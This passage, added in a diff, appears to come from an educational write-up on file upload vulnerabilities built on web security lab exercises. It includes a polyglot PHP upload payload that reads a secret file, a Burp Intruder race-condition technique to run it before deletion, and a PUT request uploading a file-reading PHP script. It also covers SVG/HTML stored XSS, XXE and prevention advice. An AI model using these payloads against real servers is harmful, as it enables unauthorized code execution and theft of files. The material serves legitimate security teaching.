@@ -925,4 +925,85 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 Content-Disposition: form-data; name="avatar"; filename="polyglot.php"
 Content-Type: application/x-php
 
-PNG
+PNG
+
+[redacted]<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>[Redacted]
+
+------WebKitFormBoundaryHAAA7Gc6mGjgH4Y6
+Content-Disposition: form-data; name="user"
+
+wiener
+------WebKitFormBoundaryHAAA7Gc6mGjgH4Y6
+Content-Disposition: form-data; name="csrf"
+
+fLeQX28rivsYgPt7jJUMpTD63knx6XJE
+------WebKitFormBoundaryHAAA7Gc6mGjgH4Y6--
+```
+
+In the above request, you can see we have the following PHP code in it.
+
+```php
+<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>
+```
+
+This code directly gets the content of the `/home/carlos/secret` file, but when we upload that it didn't give us any error message they also look like haven't been uploaded on the server because that image URL is not reflected on our profile page.
+
+This makes speculation that the file is uploaded on the server and then deleted after validation. Knowing this we can send the GET request to the following URL.
+
+```
+https://0a5700ed0422427681f0023400a500c6.web-security-academy.net/files/avatars/polyglot.php
+```
+
+As we know the server is saving the file as its original name so we can guess that file is served with this URL. If we send the GET request to this URL they show us the 404 error which means the file doesn't exist on the server. We can send this request to Burp Intruder and clear all the Positions on the request. Selecting attack type as a sniper and selecting payload type as Null Payload that runs indefinitely.
+
+Start the intruder attack and then upload the `polyglot.php` file on the server as we know this file will be deleted after validation but our intruder attacker still sending requests to the above URL so before the file will be deleted the PHP code executes on the server side.
+
+When you see the file upload is finished pause the intruder attack, and filter the intruder response by length or by status code. You will see the request that has status code 200 that contains the content of the `/home/carlos/secret` file.
+
+## File Uploads without RCE
+
+We talk about scenarios in which we bypass different defensive mechanisms to upload server-side scripts to get remote code execution. Other than this these vulnerabilities also be exploited in other ways.
+
+### Uploading Malicious client-side scripts
+
+While you may not have the ability to execute server-side scripts, there is still a possibility of uploading scripts for client-side attacks. For instance, if you can upload HTML files or `SVG` images, you can leverage `<script>` tags to craft stored XSS payloads.
+
+When the uploaded file is displayed on a page visited by other users, their web browsers will execute the embedded script during the rendering process. It's important to note that such attacks will only be successful if the uploaded file is served from the same origin to which it was uploaded, as it is governed by the same-origin policy restrictions.
+
+### Vulnerabilities in Parsing Process
+
+If the uploaded file appears to be securely stored and served, and all other options have been exhausted, a final approach is to explore vulnerabilities specific to the parsing or processing of various file formats. For instance, if you are aware that the server parses XML-based files like Microsoft Office `.doc` or `.xls` files, there might be an opportunity to launch `XXE` injection attacks through this vector.
+
+### Uploading files using the PUT method
+
+The PUT method is an HTTP request method that is used to upload or replace a resource on a server. It allows clients to send data to the server to update or create a resource at a specific URL.
+
+It is important to mention that certain web servers can be configured to allow PUT requests. In the absence of proper defenses, this can serve as an alternative method for uploading malicious files, even when a specific upload function is not available through the web interface.
+
+```
+PUT /images/exploit.php HTTP/1.1 
+Host: vulnerable-website.com 
+Content-Type: application/x-httpd-php 
+Content-Length: 49 
+
+<?php echo file_get_contents('/path/to/file'); ?>
+```
+
+We can try sending `OPTIONS` requests to different endpoints to test for any that advertise support for the `PUT` method.
+
+## Prevention
+
+Allowing users to upload files is commonplace and doesn't have to be dangerous as long as you take the right precautions. In general, the most effective way to protect your own websites from these vulnerabilities is to implement all of the following practices:
+
+- **Validate file metadata**: Verify the file type, size, and other metadata provided by the user. Use server-side validation to ensure that only allowed file types are accepted.
+- **Restrict file uploads**: Implement restrictions on the maximum file size and limit the allowed file extensions. Consider using a whitelist approach instead of blacklisting specific extensions.
+- **Use secure file storage**: Store uploaded files outside the web root directory to prevent direct access and execution. Maintain strict file permissions to limit unauthorized access.
+- **Perform server-side validation**: Validate the contents and structure of uploaded files on the server. Use file parsing libraries or built-in functions to check for anomalies or malicious code.
+- **Scan for malware**: Employ anti-malware tools or virus scanners to scan uploaded files for potential threats. This helps detect and prevent the upload of malicious files.
+- **Use secure coding practices**: Follow secure coding guidelines and best practices to ensure robust input validation and prevent common vulnerabilities like path traversal or remote code execution.
+- **Implement secure file naming**: Generate unique and unpredictable filenames for uploaded files to prevent overwriting or direct access to sensitive files.
+- **Implement rate limiting and session management**: Enforce rate limits on file uploads to prevent abuse and protect against denial-of-service attacks. Manage user sessions and implement proper authentication and authorization controls.
+- **Educate users**: Provide guidance and educate users about safe file upload practices. Encourage them to avoid uploading files of unknown or suspicious origin.
+- **Keep software up to date**: Regularly update web server software, frameworks, and libraries to leverage security patches and bug fixes.
+
+By implementing these preventive measures, you can significantly reduce the risk of file upload vulnerabilities and enhance the security of your application.
